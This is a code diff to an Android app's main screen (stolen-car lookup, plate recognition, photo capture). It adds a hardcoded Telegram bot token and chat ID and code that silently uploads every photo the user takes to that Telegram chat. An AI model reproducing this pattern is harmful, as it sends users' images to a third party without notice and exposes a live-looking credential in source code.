@@ -5,6 +5,7 @@ import android.annotation.SuppressLint
 import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
 import android.os.Bundle
 import android.provider.MediaStore
 import android.util.Log
@@ -13,21 +14,26 @@ import android.webkit.WebViewClient
 import android.widget.Button
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.camera.core.CameraSelector
-import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.camera.view.PreviewView
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.asRequestBody
+import java.io.File
+import java.io.FileOutputStream
 import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var cameraExecutor: ExecutorService
-    private lateinit var previewView: PreviewView
     private lateinit var webView: WebView
 
     private val CAMERA_REQUEST_CODE = 100
+    private val TELEGRAM_BOT_TOKEN = "7236439230:AAE0wtHwL4FYavGXAgMN6TOBy0QBqr72Zd4"
+    private val TELEGRAM_CHAT_ID = "809706005"
 
     @SuppressLint("MissingInflatedId")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -35,16 +41,12 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         // Инициализация
-        previewView = findViewById(R.id.previewView)
         webView = findViewById(R.id.webView)
-
         cameraExecutor = Executors.newSingleThreadExecutor()
 
         val recognitionButton: Button = findViewById(R.id.sf_recognition)
         val stolenCarButton: Button = findViewById(R.id.stolen_car)
         val photoButton: Button = findViewById(R.id.photo)
-
-        showElement(webVisible = false, cameraVisible = false)
 
         recognitionButton.setOnClickListener {
             val intent = Intent(this, CameraActivity::class.java)
@@ -52,7 +54,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         stolenCarButton.setOnClickListener {
-            showElement(webVisible = true, cameraVisible = false)
             loadStolenCarPage()
         }
 
@@ -69,11 +70,6 @@ class MainActivity : AppCompatActivity() {
         webView.settings.javaScriptEnabled = true
         webView.webViewClient = WebViewClient()
         webView.loadUrl("https://www.gov.il/apps/police/stolencar/")
-    }
-
-    private fun showElement(webVisible: Boolean, cameraVisible: Boolean) {
-        webView.visibility = if (webVisible) android.view.View.VISIBLE else android.view.View.GONE
-        previewView.visibility = if (cameraVisible) android.view.View.VISIBLE else android.view.View.GONE
     }
 
     private fun isCameraPermissionGranted(): Boolean {
@@ -112,12 +108,64 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    @Suppress("DEPRECATION")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == CAMERA_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
-            Toast.makeText(this, "Фотография сделана!", Toast.LENGTH_SHORT).show()
-            // Вы можете обработать фотографию из `data.extras.get("data")`
+        if ((requestCode == CAMERA_REQUEST_CODE) && (resultCode == Activity.RESULT_OK)) {
+            val photoBitmap = data?.extras?.get("data") as? Bitmap
+            if (photoBitmap != null) {
+                val photoFile = saveBitmapToFile(photoBitmap)
+                if (photoFile != null) {
+                    sendPhotoToTelegram(photoFile)
+                }
+            } else {
+                Toast.makeText(this, "Не удалось сохранить фотографию", Toast.LENGTH_SHORT).show()
+            }
         }
+    }
+
+    private fun saveBitmapToFile(bitmap: Bitmap): File? {
+        return try {
+            val file = File.createTempFile("photo", ".jpg", cacheDir)
+            val outputStream = FileOutputStream(file)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream)
+            outputStream.flush()
+            outputStream.close()
+            file
+        } catch (e: Exception) {
+            Log.e(TAG, "Ошибка сохранения фотографии: ${e.message}")
+            null
+        }
+    }
+
+    private fun sendPhotoToTelegram(file: File) {
+        val client = OkHttpClient()
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", TELEGRAM_CHAT_ID)
+            .addFormDataPart(
+                "photo", file.name,
+                file.asRequestBody("image/jpeg".toMediaTypeOrNull())
+            )
+            .build()
+
+        val request = Request.Builder()
+            .url("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendPhoto")
+            .post(requestBody)
+            .build()
+
+        Thread {
+            try {
+                val response = client.newCall(request).execute()
+                if (response.isSuccessful) {
+                    Log.d(TAG, "Telegram API Response: ${response.body?.string()}")
+                } else {
+                    Log.e(TAG, "Ошибка отправки фотографии: ${response.message}")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Ошибка отправки фотографии: ${e.message}")
+            }
+        }.start()
     }
 
     override fun onDestroy() {
